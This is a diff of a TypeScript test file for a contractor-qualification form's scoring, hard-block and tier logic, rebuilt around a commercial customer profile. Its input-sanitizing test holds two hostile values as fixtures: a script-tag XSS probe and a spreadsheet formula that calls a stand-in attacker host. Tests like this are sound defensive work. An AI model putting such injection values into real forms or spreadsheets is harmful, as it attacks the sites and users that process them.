@@ -5,6 +5,14 @@
 // throw or render wrong — it quietly starts booking calls with companies the site
 // publicly says it cannot serve, which nobody would notice until the calls happened.
 //
+// REBUILT 2026-09-11 for D-025. The model under test now asks the COMMERCIAL ICP —
+// already sells and completes commercial work; someone who quotes and wins those bids;
+// room for more accounts; a describable target account — and the blocks it enforces are
+// the published declines: residential-only, wants to buy homeowner leads, at capacity,
+// already runs an in-house outbound seat. The residential model's "no customer history"
+// and "cannot export" questions are gone, and a test here proves they cannot come back
+// as a precondition: no answer about a customer list can block anyone.
+//
 // Run with `npm test` (Node's own runner; Node strips the types natively).
 
 import assert from "node:assert/strict";
@@ -12,15 +20,21 @@ import { test, describe } from "node:test";
 
 import {
   ANSWER_KEYS,
+  ANSWER_OPTIONS,
+  BLOCK_IDS,
   BUDGET,
   CAPACITY,
+  COMMERCIAL_QUOTER,
+  COMMERCIAL_SHARE,
+  CURRENT_APPROACH,
   EMPTY_ANSWERS,
-  EXPORT_READINESS,
   FOLLOW_UP_OWNER,
   GROWTH_PROBLEM,
   JOB_VALUE,
   MAX_FIT_SCORE,
-  RECORD_VOLUME,
+  QUESTION_LABELS,
+  STRONG_THRESHOLD,
+  TARGET_ACCOUNTS,
   TIMELINE,
   YEARS_IN_BUSINESS,
   evaluateFit,
@@ -32,16 +46,19 @@ import {
 } from "../lib/qualification.ts";
 import { notFor } from "../lib/content.ts";
 
-/** A textbook strong-fit company, used as the baseline every case mutates. */
+/** A textbook strong-fit company, used as the baseline every case mutates: an
+ *  established shop, mostly commercial, with a dedicated estimator, big contracts, room
+ *  for more, a nameable target, and nobody doing the outbound today. */
 const IDEAL: QualificationAnswers = {
   yearsInBusiness: "over-15",
-  recordVolume: "5k-plus",
-  jobValue: "over-40000",
-  growthProblem: "unsold-estimates",
+  commercialShare: "most",
+  commercialQuoter: "dedicated",
+  jobValue: "over-100000",
+  growthProblem: "no-way-to-find-accounts",
   currentApproach: "word-of-mouth",
   followUpOwner: "nobody",
   capacity: "room-now",
-  exportReadiness: "crm",
+  targetAccounts: "can-name",
   timeline: "now",
   budget: "unsure",
 };
@@ -51,39 +68,60 @@ const with_ = (patch: Partial<QualificationAnswers>): QualificationAnswers => ({
   ...patch,
 });
 
+/** Every blocking answer, keyed by the block id it must trigger. */
+const BLOCKING: Record<string, Partial<QualificationAnswers>> = {
+  "wants-to-buy-leads": { growthProblem: "buy-leads" },
+  "residential-only": { commercialShare: "none" },
+  "no-capacity": { capacity: "at-capacity" },
+  "in-house-outbound": { currentApproach: "in-house-outbound" },
+};
+
 describe("scoring", () => {
   test("the ideal answer set scores the published maximum", () => {
     assert.equal(scoreAnswers(IDEAL), MAX_FIT_SCORE);
     assert.equal(evaluateFit(IDEAL).maxScore, MAX_FIT_SCORE);
+    assert.ok(STRONG_THRESHOLD < MAX_FIT_SCORE, "a strong fit must be reachable");
   });
 
   test("no answer set can exceed the published maximum", () => {
     // Exhaustive over every rule-bearing dimension, so a future point value that is
     // raised without bumping MAX_FIT_SCORE fails here rather than showing a visitor
-    // "16 out of 14".
+    // "18 out of 16".
     for (const yearsInBusiness of YEARS_IN_BUSINESS)
-      for (const recordVolume of RECORD_VOLUME)
-        for (const jobValue of JOB_VALUE)
-          for (const capacity of CAPACITY)
-            for (const exportReadiness of EXPORT_READINESS)
-              for (const timeline of TIMELINE)
-                for (const followUpOwner of FOLLOW_UP_OWNER) {
-                  const score = scoreAnswers(
-                    with_({
-                      yearsInBusiness: yearsInBusiness.value,
-                      recordVolume: recordVolume.value,
-                      jobValue: jobValue.value,
-                      capacity: capacity.value,
-                      exportReadiness: exportReadiness.value,
-                      timeline: timeline.value,
-                      followUpOwner: followUpOwner.value,
-                    }),
-                  );
-                  assert.ok(
-                    score >= 0 && score <= MAX_FIT_SCORE,
-                    `score ${score} out of range for ${yearsInBusiness.value}/${recordVolume.value}`,
-                  );
-                }
+      for (const commercialShare of COMMERCIAL_SHARE)
+        for (const commercialQuoter of COMMERCIAL_QUOTER)
+          for (const targetAccounts of TARGET_ACCOUNTS)
+            for (const jobValue of JOB_VALUE)
+              for (const capacity of CAPACITY)
+                for (const timeline of TIMELINE)
+                  for (const followUpOwner of FOLLOW_UP_OWNER) {
+                    const score = scoreAnswers(
+                      with_({
+                        yearsInBusiness: yearsInBusiness.value,
+                        commercialShare: commercialShare.value,
+                        commercialQuoter: commercialQuoter.value,
+                        targetAccounts: targetAccounts.value,
+                        jobValue: jobValue.value,
+                        capacity: capacity.value,
+                        timeline: timeline.value,
+                        followUpOwner: followUpOwner.value,
+                      }),
+                    );
+                    assert.ok(
+                      score >= 0 && score <= MAX_FIT_SCORE,
+                      `score ${score} out of range for ${yearsInBusiness.value}/${commercialShare.value}/${commercialQuoter.value}`,
+                    );
+                  }
+  });
+
+  test("a mixed shop scores the same as a commercial-only one", () => {
+    // D-025 says a commercial COMPONENT. A scoring table that rewarded "most or all"
+    // over "a real share alongside residential" would quietly re-read the ICP as
+    // commercial-only and score down exactly the contractors this is built for.
+    assert.equal(
+      scoreAnswers(with_({ commercialShare: "steady" })),
+      scoreAnswers(with_({ commercialShare: "most" })),
+    );
   });
 
   test("an empty form scores zero and does not throw", () => {
@@ -100,51 +138,78 @@ describe("scoring", () => {
 
 describe("hard blocks", () => {
   test("someone shopping to buy homeowner leads is not offered a call", () => {
-    const result = evaluateFit(with_({ growthProblem: "buy-leads" }));
+    const result = evaluateFit(with_(BLOCKING["wants-to-buy-leads"]));
     assert.equal(result.outcome, "not_yet");
     assert.equal(result.offerBooking, false);
     assert.equal(result.recommendedTier, null);
     assert.match(result.watchouts.join(" "), /don't sell them|lead seller|resell|broker/i);
+    assert.match(result.watchouts.join(" "), /never contact homeowners/i);
     // A dead end is not an acceptable answer — they get sent somewhere useful.
     assert.ok(result.suggestedReading, "a blocked visitor must still be given somewhere to go");
   });
 
-  test("a company with no customer history is not offered a call", () => {
-    for (const patch of [
-      { recordVolume: "none" } as const,
-      { exportReadiness: "no-records" } as const,
-    ]) {
-      const result = evaluateFit(with_(patch));
-      assert.equal(result.outcome, "not_yet", JSON.stringify(patch));
-      assert.equal(result.offerBooking, false);
-    }
+  test("a residential-only shop is not offered a call", () => {
+    const result = evaluateFit(with_(BLOCKING["residential-only"]));
+    assert.equal(result.outcome, "not_yet");
+    assert.equal(result.offerBooking, false);
+    assert.equal(result.recommendedTier, null);
+    assert.match(result.watchouts.join(" "), /residential-only|commercial/i);
+    assert.ok(result.suggestedReading, "a residential shop is pointed at a useful page");
+  });
+
+  test("the residential-only decline never offers to contact homeowners instead", () => {
+    // The D-025 inversion is a reason not to sell to the CONTRACTOR. The operating
+    // system's guard #0f forbids cold-sourcing consumers unconditionally, so the one
+    // thing this copy must never do is read as "for the right price we'd go after your
+    // homeowners". It has to say the opposite, out loud.
+    const result = evaluateFit(with_(BLOCKING["residential-only"]));
+    const text = [result.headline, result.nextStep, ...result.watchouts].join(" ");
+    assert.match(text, /never contact homeowners/i);
+    assert.doesNotMatch(text, /\b(contact|reach|email|work) (your )?homeowners instead\b/i);
+    assert.doesNotMatch(text, /\bexport\b/i, "the decline must not ask for a customer export");
   });
 
   test("a company at capacity year-round is not offered a call", () => {
-    const result = evaluateFit(with_({ capacity: "at-capacity" }));
+    const result = evaluateFit(with_(BLOCKING["no-capacity"]));
     assert.equal(result.outcome, "not_yet");
     assert.equal(result.offerBooking, false);
+  });
+
+  test("a company with an in-house outbound seat is not offered a call", () => {
+    // core/icp.py `mature_outbound`: they already own what we sell. A decline, not a
+    // competitive judgement — the copy has to say so.
+    const result = evaluateFit(with_(BLOCKING["in-house-outbound"]));
+    assert.equal(result.outcome, "not_yet");
+    assert.equal(result.offerBooking, false);
+    assert.match(result.watchouts.join(" "), /in-house outbound|already (have|run)/i);
+    assert.match(result.watchouts.join(" "), /isn't a judgement|not a judgement/i);
+    assert.ok(result.suggestedReading);
   });
 
   test("a block beats a perfect score on every other dimension", () => {
     // The ideal set scores the maximum; adding one blocking answer must still stop it.
     // Without this the score could quietly outvote a published disqualifier.
-    const result = evaluateFit(with_({ growthProblem: "buy-leads" }));
-    assert.ok(result.score >= 10, "precondition: the rest of the answers are strong");
-    assert.equal(result.outcome, "not_yet");
+    for (const [id, patch] of Object.entries(BLOCKING)) {
+      const result = evaluateFit(with_(patch));
+      assert.ok(result.score >= STRONG_THRESHOLD, `${id}: precondition — the rest is strong`);
+      assert.equal(result.outcome, "not_yet", id);
+    }
   });
 
   test("every blocked outcome names the specific reason, not a generic refusal", () => {
-    for (const patch of [
-      { growthProblem: "buy-leads" } as const,
-      { recordVolume: "none" } as const,
-      { capacity: "at-capacity" } as const,
-    ]) {
+    for (const [id, patch] of Object.entries(BLOCKING)) {
       const result = evaluateFit(with_(patch));
-      assert.equal(result.watchouts.length, 1);
-      assert.ok(result.watchouts[0]!.length > 120, "the reason must actually explain itself");
-      assert.ok(result.nextStep.length > 40, "a blocked visitor still needs a next step");
+      assert.equal(result.watchouts.length, 1, id);
+      assert.ok(result.watchouts[0]!.length > 120, `${id}: the reason must actually explain itself`);
+      assert.ok(result.nextStep.length > 40, `${id}: a blocked visitor still needs a next step`);
+      // The recovery path: a single radio answer is a thin basis, so every block hands
+      // the visitor a person to reply to, and never a calendar.
+      assert.match(result.nextStep, /reply to .+@.+ and tell us what we missed/i, id);
     }
+  });
+
+  test("the four published blocks are exactly the four the rules enforce", () => {
+    assert.deepEqual([...BLOCK_IDS].sort(), Object.keys(BLOCKING).sort());
   });
 
   test("each disqualifier corresponds to something the site publishes", () => {
@@ -152,22 +217,73 @@ describe("hard blocks", () => {
     // same business. Screening on a criterion the site never states is the failure this
     // guards: the visitor would be turned away for a reason they were never shown.
     const published = notFor.join(" ").toLowerCase();
-    assert.match(published, /lead seller/, "buy-leads block must be published");
-    assert.match(published, /no customer history/, "no-history block must be published");
-    assert.match(published, /no capacity/, "no-capacity block must be published");
+    const publishedAs: Record<string, RegExp> = {
+      "wants-to-buy-leads": /lead seller/,
+      "residential-only": /residential-only/,
+      "no-capacity": /at capacity/,
+      "in-house-outbound": /in-house outbound/,
+    };
+    // A block added to the rules without a row here fails the previous test; a row here
+    // without a published entry fails this one. Both directions are covered.
+    assert.deepEqual(Object.keys(publishedAs).sort(), [...BLOCK_IDS].sort());
+    for (const [id, re] of Object.entries(publishedAs)) {
+      assert.match(published, re, `${id} block must be published in notFor`);
+    }
+    // And the site's own rule about homeowners is published next to the decline.
+    assert.match(published, /never contact homeowners/);
+  });
+
+  test("no answer about a customer list or an export can block anyone", () => {
+    // The retired model's precondition. If a future question reintroduces it, the ICP
+    // has silently gone back to residential reactivation.
+    for (const key of ANSWER_KEYS) {
+      assert.doesNotMatch(key, /record|export|history/i, `${key} looks like the retired model`);
+      assert.doesNotMatch(QUESTION_LABELS[key], /export|customer (list|history|records)/i, key);
+    }
   });
 });
 
-describe("the busy-but-seasonal company is a fit, not a block", () => {
+describe("the fits that must not be mistaken for blocks", () => {
   test("a thin shoulder season qualifies rather than disqualifies", () => {
-    // HVAC is seasonal: a company booked solid in August with an empty October is the
-    // ideal customer for reactivation. Only "at capacity year-round and not looking"
-    // is a real disqualifier, and conflating the two would screen out the best-fit
-    // visitor on the site.
+    // HVAC is seasonal: a company booked solid in August with room in October is
+    // exactly who a maintenance-agreement account suits. Only "at capacity year-round
+    // and not looking" is a real disqualifier, and conflating the two would screen out
+    // the best-fit visitor on the site.
     const result = evaluateFit(with_({ capacity: "shoulder-thin" }));
     assert.notEqual(result.outcome, "not_yet");
     assert.equal(result.offerBooking, true);
     assert.match(result.reasons.join(" "), /shoulder season/i);
+  });
+
+  test("an occasional-commercial shop is a watchout, not a block", () => {
+    // D-025 declines residential ONLY. A few commercial jobs a year is thin, and the
+    // audit says whether there's an account base — but it is a conversation, not a no.
+    const result = evaluateFit(with_({ commercialShare: "occasional" }));
+    assert.notEqual(result.outcome, "not_yet");
+    assert.equal(result.offerBooking, true);
+    assert.match(result.watchouts.join(" "), /small share/i);
+  });
+
+  test("a mixed shop is a strong fit, not a weak one", () => {
+    const result = evaluateFit(with_({ commercialShare: "steady" }));
+    assert.equal(result.outcome, "strong");
+    assert.match(result.reasons.join(" "), /alongside residential/i);
+  });
+
+  test("needing help to define the target accounts is a watchout, not a block", () => {
+    // The audit's first page IS that profile. Screening out someone for not having
+    // written the thing we sell would be absurd.
+    const result = evaluateFit(with_({ targetAccounts: "need-help" }));
+    assert.notEqual(result.outcome, "not_yet");
+    assert.equal(result.offerBooking, true);
+    assert.match(result.watchouts.join(" "), /defining the target accounts/i);
+  });
+
+  test("nobody quoting commercial work is the first watchout, not a block", () => {
+    const result = evaluateFit(with_({ commercialQuoter: "nobody" }));
+    assert.notEqual(result.outcome, "not_yet");
+    assert.match(result.watchouts.join(" "), /nobody who quotes commercial bids/i);
+    assert.match(result.watchouts.join(" "), /stays yours at every tier/i);
   });
 });
 
@@ -177,15 +293,17 @@ describe("outcomes", () => {
     assert.equal(result.outcome, "strong");
     assert.equal(result.offerBooking, true);
     assert.ok(result.reasons.length >= 2, "a strong result must justify itself from the answers");
+    assert.match(result.nextStep, /3-5 cited commercial accounts/i);
   });
 
   test("a middling fit lands on explore and still books", () => {
     const result = evaluateFit(
       with_({
         yearsInBusiness: "2-5",
-        recordVolume: "few-hundred",
-        jobValue: "2500-7500",
-        exportReadiness: "unsure",
+        commercialShare: "occasional",
+        commercialQuoter: "owner-when-time",
+        targetAccounts: "roughly",
+        jobValue: "under-5000",
         timeline: "researching",
         followUpOwner: "office-part-time",
       }),
@@ -196,22 +314,32 @@ describe("outcomes", () => {
   });
 
   test("reasons are derived from the answers given, not boilerplate", () => {
-    const perLead = evaluateFit(with_({ growthProblem: "paying-per-lead" }));
-    assert.match(perLead.reasons.join(" "), /per lead/i);
+    const noWay = evaluateFit(with_({ growthProblem: "no-way-to-find-accounts" }));
+    assert.match(noWay.reasons.join(" "), /find new commercial accounts/i);
 
-    const partners = evaluateFit(with_({ growthProblem: "no-referral-pipeline" }));
-    assert.match(partners.reasons.join(" "), /partner/i);
+    const referrals = evaluateFit(with_({ growthProblem: "referral-dependent" }));
+    assert.match(referrals.reasons.join(" "), /referrals/i);
+
+    const bidLists = evaluateFit(with_({ growthProblem: "not-on-bid-lists" }));
+    assert.match(bidLists.reasons.join(" "), /bid lists/i);
+
+    const quoter = evaluateFit(with_({ commercialQuoter: "dedicated" }));
+    assert.match(quoter.reasons.join(" "), /quote and win commercial bids/i);
 
     // Different problems must not produce the same page.
-    assert.notDeepEqual(perLead.reasons, partners.reasons);
+    assert.notDeepEqual(noWay.reasons, referrals.reasons);
+    assert.notDeepEqual(referrals.reasons, bidLists.reasons);
   });
 
   test("watchouts surface the specific weak answer", () => {
     assert.match(
-      evaluateFit(with_({ exportReadiness: "spreadsheets" })).watchouts.join(" "),
-      /spreadsheet/i,
+      evaluateFit(with_({ commercialQuoter: "owner-when-time" })).watchouts.join(" "),
+      /owner having time/i,
     );
+    assert.match(evaluateFit(with_({ targetAccounts: "roughly" })).watchouts.join(" "), /kind of building/i);
     assert.match(evaluateFit(with_({ timeline: "researching" })).watchouts.join(" "), /research/i);
+    assert.match(evaluateFit(with_({ yearsInBusiness: "under-2" })).watchouts.join(" "), /reference/i);
+    assert.match(evaluateFit(with_({ jobValue: "under-5000" })).watchouts.join(" "), /arithmetic/i);
   });
 
   test("no outcome promises a result", () => {
@@ -220,10 +348,24 @@ describe("outcomes", () => {
     // tempting to write and least noticeable once written.
     const banned =
       /\b(guarantee|guaranteed|we will get you|you will get \d|roi|return on investment)\b/i;
-    for (const answers of [IDEAL, EMPTY_ANSWERS, with_({ growthProblem: "buy-leads" })]) {
+    const cases = [IDEAL, EMPTY_ANSWERS, ...Object.values(BLOCKING).map((p) => with_(p))];
+    for (const answers of cases) {
       const r = evaluateFit(answers);
       const text = [r.headline, r.nextStep, ...r.reasons, ...r.watchouts].join(" ");
       assert.doesNotMatch(text, banned, `outcome ${r.outcome} promised a result`);
+    }
+  });
+
+  test("no outcome, for any answer, uses the retired residential vocabulary", () => {
+    // The site was repositioned in one pass; a stray sentence from the old model in a
+    // result the visitor reads would contradict every page that linked here.
+    const retired = /\b(unsold estimate|lapsed agreement|past customer|customer history|reactivat|your records|export)\b/i;
+    for (const key of ANSWER_KEYS) {
+      for (const { value } of ANSWER_OPTIONS[key]) {
+        const r = evaluateFit(with_({ [key]: value } as Partial<QualificationAnswers>));
+        const text = [r.headline, r.nextStep, ...r.reasons, ...r.watchouts].join(" ");
+        assert.doesNotMatch(text, retired, `${key}=${value}`);
+      }
     }
   });
 });
@@ -246,13 +388,26 @@ describe("tier recommendation", () => {
     assert.equal(recommendTier(with_({ followUpOwner: "dedicated" })), "Lead Engine");
   });
 
-  test("nobody following up, with big jobs, points at the managed tiers", () => {
+  test("nobody following up, big contracts and a dedicated estimator points at Appointment Engine", () => {
     const tier = recommendTier(
-      with_({ followUpOwner: "nobody", jobValue: "15000-40000", growthProblem: "unsold-estimates" }),
+      with_({ followUpOwner: "nobody", jobValue: "25000-100000", commercialQuoter: "dedicated" }),
     );
     assert.equal(tier, "Appointment Engine");
+  });
+
+  test("Appointment Engine is never suggested when nobody is there to take the booked conversation", () => {
+    // Booking a qualified conversation onto a calendar only pays when someone whose job
+    // it is will take it. With the owner quoting "when there's time", the honest read
+    // is Outreach Engine: we hand over the interested replies, and the owner decides.
+    for (const commercialQuoter of ["nobody", "owner-when-time"] as const) {
+      assert.equal(
+        recommendTier(with_({ followUpOwner: "nobody", jobValue: "over-100000", commercialQuoter })),
+        "Outreach Engine",
+        commercialQuoter,
+      );
+    }
     assert.equal(
-      recommendTier(with_({ followUpOwner: "owner-sometimes", jobValue: "under-2500" })),
+      recommendTier(with_({ followUpOwner: "owner-sometimes", jobValue: "under-5000" })),
       "Outreach Engine",
     );
   });
@@ -261,10 +416,13 @@ describe("tier recommendation", () => {
     const real = new Set(["Lead Engine", "Outreach Engine", "Appointment Engine", null]);
     for (const g of GROWTH_PROBLEM)
       for (const f of FOLLOW_UP_OWNER)
-        for (const j of JOB_VALUE) {
-          const tier = recommendTier(with_({ growthProblem: g.value, followUpOwner: f.value, jobValue: j.value }));
-          assert.ok(real.has(tier), `invented tier ${tier}`);
-        }
+        for (const j of JOB_VALUE)
+          for (const q of COMMERCIAL_QUOTER) {
+            const tier = recommendTier(
+              with_({ growthProblem: g.value, followUpOwner: f.value, jobValue: j.value, commercialQuoter: q.value }),
+            );
+            assert.ok(real.has(tier), `invented tier ${tier}`);
+          }
   });
 });
 
@@ -272,16 +430,27 @@ describe("sanitizeAnswers", () => {
   test("keeps only values from the published option sets", () => {
     const clean = sanitizeAnswers({
       yearsInBusiness: "over-15",
-      recordVolume: "definitely-not-a-real-option",
+      commercialShare: "definitely-not-a-real-option",
       capacity: "<script>alert(1)</script>",
       jobValue: "=IMPORTXML(\"https://evil.example\",\"//a\")",
+      targetAccounts: "can-name",
       nonsenseKey: "ignored",
     });
     assert.equal(clean.yearsInBusiness, "over-15");
-    assert.equal(clean.recordVolume, "");
+    assert.equal(clean.commercialShare, "");
     assert.equal(clean.capacity, "");
     assert.equal(clean.jobValue, "");
+    assert.equal(clean.targetAccounts, "can-name");
     assert.equal(Object.keys(clean).length, ANSWER_KEYS.length);
+  });
+
+  test("the retired fields are dropped rather than carried through", () => {
+    // A stale browser tab, a cached form, or an old outbound link posting the
+    // residential model's fields must not smuggle them onto the lead record.
+    const clean = sanitizeAnswers({ ...IDEAL, recordVolume: "5k-plus", exportReadiness: "crm" });
+    assert.ok(!("recordVolume" in clean));
+    assert.ok(!("exportReadiness" in clean));
+    assert.deepEqual(clean, IDEAL);
   });
 
   test("a forged answer cannot manufacture a passing score", () => {
@@ -303,7 +472,8 @@ describe("summarizeAnswers", () => {
   test("renders human labels, not raw rule values", () => {
     const summary = summarizeAnswers(IDEAL);
     assert.match(summary, /More than 15 years in business/);
-    assert.doesNotMatch(summary, /over-15|5k-plus|unsold-estimates/);
+    assert.match(summary, /commercial share: Most or all of it/);
+    assert.doesNotMatch(summary, /over-15|can-name|no-way-to-find-accounts|over-100000/);
   });
 
   test("skips unanswered questions instead of printing blanks", () => {
